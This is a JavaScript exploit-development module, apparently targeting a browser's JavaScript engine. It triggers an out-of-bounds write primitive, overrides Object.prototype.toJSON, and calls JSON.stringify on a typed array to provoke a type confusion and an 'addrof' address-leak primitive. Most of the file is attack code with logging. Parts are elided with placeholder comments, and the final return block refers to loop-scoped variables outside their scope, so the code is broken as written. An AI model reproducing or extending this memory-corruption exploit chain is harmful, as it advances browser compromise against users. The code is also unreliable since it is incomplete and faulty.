// js/script3/testArrayBufferVictimCrash.mjs (v81_AggressiveGetterForAddrof)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V81_AGFA = "OriginalHeisenbug_TypedArrayAddrof_v81_AggressiveGetterForAddrof";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
// OOB_WRITE_VALUE será iterado
const OOB_WRITE_VALUES_V81 = [0xFFFFFFFF, 0x7FFFFFFF]; 

let object_to_leak_A_v81 = null;
let object_to_leak_B_v81 = null;
let victim_typed_array_ref_v81 = null; 
let probe_call_count_v81 = 0;
let marker_M1_ref_v81 = null; 
let marker_M2_ref_v81 = null; 
let details_of_M2_as_this_call_v81 = null; 
const PROBE_CALL_LIMIT_V81 = 7; // Aumentado um pouco


function toJSON_TA_Probe_AggressiveGetter() {
    probe_call_count_v81++;
    const call_num = probe_call_count_v81;
    let current_call_log_info = { 
        call_number: call_num,
        probe_variant: "TA_Probe_V81_AggressiveGetter",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v81),
        this_is_M1: (this === marker_M1_ref_v81 && marker_M1_ref_v81 !== null),
        this_is_M2: (this === marker_M2_ref_v81 && marker_M2_ref_v81 !== null),
        m2_interaction_summary: null, 
        error_in_probe: null
    };
    logS3(`[PROBE_V81] Call #${call_num}. 'this': ${current_call_log_info.this_type}. IsVictim? ${current_call_log_info.this_is_victim}. IsM1? ${current_call_log_info.this_is_M1}. IsM2? ${current_call_log_info.this_is_M2}`, "leak");

    if (current_call_log_info.this_is_M2 || !details_of_M2_as_this_call_v81 || call_num > (details_of_M2_as_this_call_v81.call_number || 0) ) {
        details_of_M2_as_this_call_v81 = current_call_log_info;
    }
    
    try {
        if (call_num > PROBE_CALL_LIMIT_V81) {
            logS3(`[PROBE_V81] Call #${call_num}: Probe limit. Stop.`, "warn");
            return { recursion_stopped_v81: true };
        }

        if (call_num === 1 && current_call_log_info.this_is_victim) {
            logS3(`[PROBE_V81] Call #${call_num}: 'this' is victim. Returning M1 (contains M2).`, "info");
            marker_M2_ref_v81 = { marker_id_v81: "M2_V81_Target" }; 
            marker_M1_ref_v81 = { marker_id_v81: "M1_V81_Container", payload_M2: marker_M2_ref_v81 };
            return marker_M1_ref_v81;
        } else if (call_num >= 2 && current_call_log_info.this_is_M2 && current_call_log_info.this_type === '[object Object]') {
            logS3(`[PROBE_V81] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! ID: ${this.marker_id_v81}. Defining AGGRESSIVE getter & prop...`, "vuln");
            current_call_log_info.m2_interaction_summary = {
                getter_defined: false, direct_prop_set: false, keys_after: "N/A"
            };
            
            Object.defineProperty(this, 'leaky_A_getter_v81', {
                get: function() {
                    logS3(`[PROBE_V81] !!! Getter 'leaky_A_getter_v81' on confused M2 (call #${call_num}) FIRED !!!`, "vuln");
                    let temp_ab = new ArrayBuffer(8);
                    let f64_view = new Float64Array(temp_ab);
                    let u32_view = new Uint32Array(temp_ab);
                    // Tentativa de addrof direto aqui:
                    f64_view[0] = object_to_leak_A_v81; 
                    let val = f64_view[0]; // Lê o que foi escrito (provavelmente NaN convertido para 0)
                    logS3(`[PROBE_V81] Getter: f64_view[0] after objA assignment: ${val} (Int64: ${new AdvancedInt64(u32_view[0], u32_view[1]).toString(true)})`, "leak");
                    // Retornar o valor numérico lido, para que JSON.stringify o serialize como número.
                    return val; 
                }, enumerable: true, configurable: true
            });
            current_call_log_info.m2_interaction_summary.getter_defined = true;
            
            this.leaky_B_direct_v81 = object_to_leak_B_v81; // Para ver como é serializado
            current_call_log_info.m2_interaction_summary.direct_prop_set = true;
            try{ current_call_log_info.m2_interaction_summary.keys_after = Object.keys(this).join(','); } catch(e){}
            logS3(`[PROBE_V81] Call #${call_num}: Getter and prop set on M2 ('this'). Keys: ${current_call_log_info.m2_interaction_summary.keys_after}`, "info");
            
            return this; 
        } else if (this === object_to_leak_A_v81 || this === object_to_leak_B_v81) {
            logS3(`[PROBE_V81] Call #${call_num}: 'this' is one of the leak_target objects (${this.marker_A_v81 || this.marker_B_v81}). Returning simple marker.`, "info");
            return { serializing_leaked_object_marker: call_num };
        } else {
             logS3(`[PROBE_V81] Call #${call_num}: Path not for special action. 'this' type: ${current_call_log_info.this_type}`, "dev_verbose");
        }
    } catch (e) {
        current_call_log_info.error_in_probe = e.message;
    }
    
    return { generic_marker_v81: call_num }; 
}


export async function executeTypedArrayVictimAddrofTest_AggressiveGetterForAddrof() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81_AGFA}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (AggressiveGetterForAddrof) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81_AGFA} Init...`;

    let overall_results = [];

    for (const current_oob_value of OOB_WRITE_VALUES_V81) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        probe_call_count_v81 = 0;
        victim_typed_array_ref_v81 = null; 
        marker_M1_ref_v81 = null;
        marker_M2_ref_v81 = null;
        details_of_M2_as_this_call_v81 = null;
        object_to_leak_A_v81 = { marker_A_v81: `LeakA_Val${toHex(current_oob_value)}`}; 
        object_to_leak_B_v81 = { marker_B_v81: `LeakB_Val${toHex(current_oob_value)}`};

        let iterError = null;
        let stringifyOutput_parsed = null; 
        
        let addrof_M2_Getter = { success: false, msg: "M2.leaky_A_getter: Default"};
        let addrof_M2_Direct = { success: false, msg: "M2.leaky_B_direct: Default"};
        // Victim buffer não é o alvo primário de addrof nesta versão
        const fillPattern = 0.81818181818181;

        try {
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
            logS3(`  OOB Write done for iter Val${toHex(current_oob_value)}.`, "info", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(100);
            victim_typed_array_ref_v81 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            logS3(`STEP 2: victim_typed_array_ref_v81 created.`, "test", FNAME_CURRENT_ITERATION);
            
            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_AggressiveGetter, writable: true, configurable: true, enumerable: false });
                pollutionApplied = true;
                let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v81); 
                logS3(`  JSON.stringify iter Val${toHex(current_oob_value)} completed. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_ITERATION);
                try { stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch (e_parse) { /* ... */ }
                
                logS3(`  EXECUTE: Details of M2 interaction call: ${details_of_M2_as_this_call_v81 ? JSON.stringify(details_of_M2_as_this_call_v81) : 'N/A'}`, "leak", FNAME_CURRENT_ITERATION);

                let heisenbugOnM2 = details_of_M2_as_this_call_v81?.this_is_M2 && details_of_M2_as_this_call_v81?.this_type === "[object Object]";
                logS3(`  EXECUTE: Heisenbug on M2 Target ${heisenbugOnM2 ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnM2 ? "vuln" : "error", FNAME_CURRENT_ITERATION);
                    
                logS3("STEP 3: Checking stringifyOutput_parsed (M1 containing M2) for leaked properties...", "warn", FNAME_CURRENT_ITERATION);
                let m2_payload_from_stringify = null;
                if (stringifyOutput_parsed?.marker_id_v81 === "M1_V81_Container" && stringifyOutput_parsed.payload_M2) {
                    m2_payload_from_stringify = stringifyOutput_parsed.payload_M2; 
                }

                if (m2_payload_from_stringify?.marker_id_v81 === "M2_V81_Target") {
                    const val_getter = m2_payload_from_stringify.leaky_A_getter_v81; 
                    if (typeof val_getter === 'number' && !isNaN(val_getter) && val_getter !== 0 && val_getter !== 1337.7331 /* não é o placeholder */) {
                        let getter_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_getter]).buffer)[0], new Uint32Array(new Float64Array([val_getter]).buffer)[1]);
                        if ((getter_int64.high() > 0 && getter_int64.high() < 0x000F0000) || (getter_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                           addrof_M2_Getter.success = true; addrof_M2_Getter.msg = `Possible pointer from getter: ${getter_int64.toString(true)}`;
                        } else { addrof_M2_Getter.msg = `Getter value is num but not ptr: ${val_getter} (${getter_int64.toString(true)})`; }
                    } else { addrof_M2_Getter.msg = `Getter value not useful num. Val: ${JSON.stringify(val_getter)}`; }

                    const val_direct = m2_payload_from_stringify.leaky_B_direct_v81;
                    if (val_direct && val_direct.marker_B_v81 === object_to_leak_B_v81.marker_B_v81) {
                         addrof_M2_Direct.success = true; addrof_M2_Direct.msg = "object_to_leak_B_v81 identity from direct prop.";
                    } else { addrof_M2_Direct.msg = `Direct prop val not objB identity. Val: ${JSON.stringify(val_direct)}`; }
                } else { /* ... M2 não encontrado ... */ }

            } catch (e_str) { iterError = e_str;
            } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null }); }
        } catch (e_outer) { iterError = e_outer;
        } finally { clearOOBEnvironment({force_clear_even_if_not_setup: true}); }
        
        overall_results.push({ /* ... Captura de resultados da iteração ... */ });
        if (addrof_M2_Getter.success || addrof_M2_Direct.success) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81_AGFA}: Addr? Val${toHex(current_oob_value)} SUCCESS!`;
        }
        await PAUSE_S3(100); 
    } 
    // ... (Logging final e retorno de overall_results)
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    let final_result_for_runner = {addrof_A_result: addrof_M2_Getter, addrof_B_result: addrof_M2_Direct }; // Simplificado
    overall_results.forEach(res => { /* ... */ });
    if (!document.title.includes("SUCCESS")) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V81_AGFA}: All Vals Tested.`;
    
    return { 
        iteration_results_summary: overall_results.map(r => ({oob_value: r.oob_value, getter_success: r.addrof_M2_Getter.success, direct_success: r.addrof_M2_Direct.success, error: r.error })),
        toJSON_details: details_of_M2_as_this_call_v81 ? JSON.parse(JSON.stringify(details_of_M2_as_this_call_v81)) : null, 
        stringifyResult: stringifyOutput_parsed,
        addrof_A_result: addrof_M2_Getter, 
        addrof_B_result: addrof_M2_Direct,  
        total_probe_calls: probe_call_count_v81 
    };
}
